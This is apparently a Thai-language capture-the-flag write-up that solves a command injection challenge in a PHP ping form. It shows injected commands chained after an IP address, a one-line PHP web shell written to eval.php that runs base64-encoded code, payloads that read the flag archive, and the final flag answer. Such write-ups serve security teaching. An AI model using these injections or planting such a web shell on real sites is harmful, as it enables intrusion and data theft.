# Scenario
- ให้ Bypass Filter เข้าไปเอา flag
- ข้อนี้เบื้องหลังถูกสร้างขึ้นให้อยู่ใน CHROOT ที่มี command ให้จำนวนเล็กน้อย

## หน้าตา command ที่ถูกรันโดย system()
```
ping -c 4 {$_POST['parameters']}
```

## Step 1: Bypass

ส่ง parameters เป็น
```
127.0.0.1; echo "hello-world"
```

ได้ Output
```
PING 127.0.0.1 (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.060 ms
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.088 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.081 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.126 ms

--- 127.0.0.1 ping statistics ---
4 packets transmitted, 4 packets received, 0.0% packet loss
round-trip min/avg/max/stddev = 0.060/0.089/0.126/0.024 ms
hello-world
```

Step 2: ทดสอบการ permission การเขียนไฟล์และอ่านไฟล์

`127.0.0.1; ls` Command not found

`127.0.0.1; cat` Command not found

`127.0.0.1; touch hello.txt` Command not found

```
127.0.0.1; echo */../.
```

Output
```
/bin /etc .flag.txt.gz /htdocs /usr
```

## Step 3: ดูว่าใช้ command อะไรได้บ้าง

```
127.0.0.1; echo */../bin
```

พบว่ามีให้แค่ `bash` `sh` `echo` `sed` `grep` `mkdir` หรือจะให้พูดง่ายๆก็คือ ใช้อะไรไม่ได้เลยนอกจาก echo

## Step 4: Inject Shell เข้าไป

เนื่องจากว่า Linux command โดนตัดทิ้งไปหมด แต่ php ยังสามารถรันได้
เลยต้องใช้ function บน php ช่วยในการรัน

```
127.0.0.1; echo '<?php eval(base64_decode($_GET["code"])); ?>' > eval.php;
```

## Step 5: เขียนโค้ด php เพื่อดึงไฟล์ flag

### แบบที่ 1: gzread()
```
//This input should be from somewhere else, hard-coded in this example
$file_name = '../.flag.txt.gz';

// Raising this value may increase performance
$buffer_size = 4096; // read 4kb at a time
$out_file_name = 'flag.txt';

// Open our files (in binary mode)
$file = gzopen($file_name, 'rb');

$out = '';

// Keep repeating until the end of the input file
while (!gzeof($file)) {
    // Read buffer-size bytes
    // Both fwrite and gzread and binary-safe
    $out = gzread($file, $buffer_size);
}

// Files are done, close files
gzclose($file);

echo $out;
```

endcode เป็น base 64 ส่งเข้า eval.php?code=
```
Ly9UaGlzIGlucHV0IHNob3VsZCBiZSBmcm9tIHNvbWV3aGVyZSBlbHNlLCBoYXJkLWNvZGVkIGluIHRoaXMgZXhhbXBsZQokZmlsZV9uYW1lID0gJy4uLy5mbGFnLnR4dC5neic7CgovLyBSYWlzaW5nIHRoaXMgdmFsdWUgbWF5IGluY3JlYXNlIHBlcmZvcm1hbmNlCiRidWZmZXJfc2l6ZSA9IDQwOTY7IC8vIHJlYWQgNGtiIGF0IGEgdGltZQokb3V0X2ZpbGVfbmFtZSA9ICdmbGFnLnR4dCc7CgovLyBPcGVuIG91ciBmaWxlcyAoaW4gYmluYXJ5IG1vZGUpCiRmaWxlID0gZ3pvcGVuKCRmaWxlX25hbWUsICdyYicpOwoKJG91dCA9ICcnOwoKLy8gS2VlcCByZXBlYXRpbmcgdW50aWwgdGhlIGVuZCBvZiB0aGUgaW5wdXQgZmlsZQp3aGlsZSAoIWd6ZW9mKCRmaWxlKSkgewogICAgLy8gUmVhZCBidWZmZXItc2l6ZSBieXRlcwogICAgLy8gQm90aCBmd3JpdGUgYW5kIGd6cmVhZCBhbmQgYmluYXJ5LXNhZmUKICAgICRvdXQgPSBnenJlYWQoJGZpbGUsICRidWZmZXJfc2l6ZSk7Cn0KCi8vIEZpbGVzIGFyZSBkb25lLCBjbG9zZSBmaWxlcwpnemNsb3NlKCRmaWxlKTsKCmVjaG8gJG91dDs=
```

### แบบที่ 2: encode ไฟล์ .flag.txt.gz ออกมาเป็น base64 แล้วเอามาเปิดในเครื่องตัวเอง

code
```
$file_name = '../.flag.txt.gz';
echo base64_encode(file_get_contents($file_name));
```

encode payload code เป็น base64 ส่งเข้า eval.php?code=
```
JGZpbGVfbmFtZSA9ICcuLi8uZmxhZy50eHQuZ3onOwplY2hvIGJhc2U2NF9lbmNvZGUoZmlsZV9nZXRfY29udGVudHMoJGZpbGVfbmFtZSkpOw==
```

# Answer

```
tni-cwc-|Id!oT|
```
